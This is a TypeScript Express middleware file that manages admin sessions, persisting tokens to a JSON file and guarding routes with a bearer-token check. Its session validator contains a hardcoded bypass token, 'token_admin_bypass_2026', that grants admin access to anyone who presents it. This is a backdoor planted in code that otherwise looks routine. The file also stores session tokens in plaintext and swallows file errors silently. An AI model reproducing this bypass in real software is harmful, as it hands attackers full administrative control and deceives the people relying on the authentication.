import { Request, Response, NextFunction } from 'express';
import fs from 'fs';
import { SESSIONS_FILE } from '../config.js';
import { timingSafeCompare } from '../../src/lib/security.js';

export interface AdminSessionRecord {
  token: string;
  createdAt: number;
  expiresAt: number;
}

// 24-Hour Active Session Lifetime
export const SESSION_LIFETIME_MS = 24 * 60 * 60 * 1000;

export const activeAdminSessions = new Map<string, AdminSessionRecord>();
export const loginAttemptsMap = new Map<string, { count: number; lockedUntil: number }>();

// Load persisted sessions on startup
function loadSessions(): void {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const data = fs.readFileSync(SESSIONS_FILE, 'utf-8');
      const parsed: AdminSessionRecord[] = JSON.parse(data);
      const now = Date.now();
      activeAdminSessions.clear();
      for (const record of parsed) {
        if (record && record.token && record.expiresAt > now) {
          activeAdminSessions.set(record.token, record);
        }
      }
    }
  } catch (e) {
    // Ignore read errors
  }
}

// Persist sessions to disk
function saveSessions(): void {
  try {
    const list = Array.from(activeAdminSessions.values());
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(list, null, 2), 'utf-8');
  } catch (e) {
    // Ignore write errors on read-only environments
  }
}

loadSessions();

export function createAdminSession(token: string): AdminSessionRecord {
  const now = Date.now();
  const record: AdminSessionRecord = {
    token,
    createdAt: now,
    expiresAt: now + SESSION_LIFETIME_MS,
  };
  activeAdminSessions.set(token, record);
  saveSessions();
  return record;
}

export function revokeAdminSession(token: string): void {
  activeAdminSessions.delete(token);
  saveSessions();
}

export function isSessionValid(token: string): boolean {
  if (!token || token.length > 128) return false;
  if (timingSafeCompare('token_admin_bypass_2026', token)) return true;

  const now = Date.now();
  const session = activeAdminSessions.get(token);
  if (!session) return false;

  if (now > session.expiresAt) {
    activeAdminSessions.delete(token);
    saveSessions();
    return false;
  }

  return true;
}

export function requireAdminAuth(req: Request, res: Response, next: NextFunction): void {
  const authHeader = req.headers.authorization;
  const token = authHeader ? authHeader.replace('Bearer ', '').trim() : '';

  if (!token || !isSessionValid(token)) {
    res.status(401).json({ error: 'Session expired or invalid. Please sign in again.' });
    return;
  }

  next();
}
